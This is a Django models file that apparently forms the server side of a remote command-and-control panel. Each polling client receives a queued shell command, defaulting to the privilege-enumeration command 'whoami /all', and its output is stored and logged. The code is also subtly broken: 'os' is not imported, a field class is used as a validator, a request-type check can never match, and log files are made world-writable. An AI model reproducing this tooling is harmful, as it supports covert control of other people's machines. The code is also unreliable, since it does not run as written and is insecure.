from django.db import models
from django.conf import settings
from datetime import datetime
from django.core.validators import RegexValidator

REQUEST_CHOICES = (
	('auth', 'AUTH'),
	('get', 'GET'),
	('post', 'POST'),
)

"""
TODO:
delete a client, update it, etc.
"""
class Client(models.Model):

	#Validators
	#onlynumbers = RegexValidator(r'^[0-9]*$','Only numbers are allowed')
	onlynumbers = models.IntegerField

	#Definition du mod√®le
	# Id unique issu du hash des informations
	id = models.CharField(max_length=200, primary_key=True)

	# Informations about the client (machine, name)
	info = models.CharField(max_length=200)

	# command to be sent to the client
	# firstCommand = "chcp 65001" 
	command = models.TextField(default="whoami /all", blank=True)

	# Last command result
	output = models.TextField(default="")

	# Polling time
	polling = models.CharField(max_length=100, default="10", verbose_name='Polling Time', validators=[onlynumbers])

	# Client's last request datetime
	lastRequest = models.DateTimeField(default=datetime.now, blank=True, verbose_name='Last Request');

	# client's request type (AUTH/GET/POST)
	# requestNature = models.CharField(default='', max_length=20)
	requestNature = models.CharField(choices=REQUEST_CHOICES, default='get', max_length=5)

	def get_all_objects(self):
		queryset = self._meta.model.objects.all()
		# you may also use: queryset = self.__class__.objects.all()
		return queryset

	def save(self, *args, **kwargs):
		# Log files path
		indivLogPath = settings.MEDIA_ROOT+'/logs/'+self.id+'.log'
		globalLogPath = settings.MEDIA_ROOT+'/logs/global.log'
				
		# If files do not exist, we create them
		if not os.path.isfile(indivLogPath):
			logFile = open(indivLogPath,"w+")
			logFile.close()
			os.chmod(indivLogPath,0o777)

		if not os.path.isfile(globalLogPath):
			logFile = open(globalLogPath,"w+")
			logFile.close()
			os.chmod(globalLogPath,0o777)

		# Global log file modification
		with open(globalLogPath,"a") as f:
			newline = self.id \
					+ ' (' \
					+ self.info.replace('\n',' ') \
					+ ') at ' \
					+ str(datetime.now().replace(microsecond=0)) \
					+' ' \
					+ self.requestNature+'\n'
			f.write(newline)

		# Individual log file modification
		if self.requestNature == "[POST RESULTS]":
			with open(indivLogPath,"a") as f:
				newline = self.output+'\n'
				f.write(newline.encode('utf8'))

		super(Client, self).save(*args, **kwargs)

	def __str__(self):
		return self.info
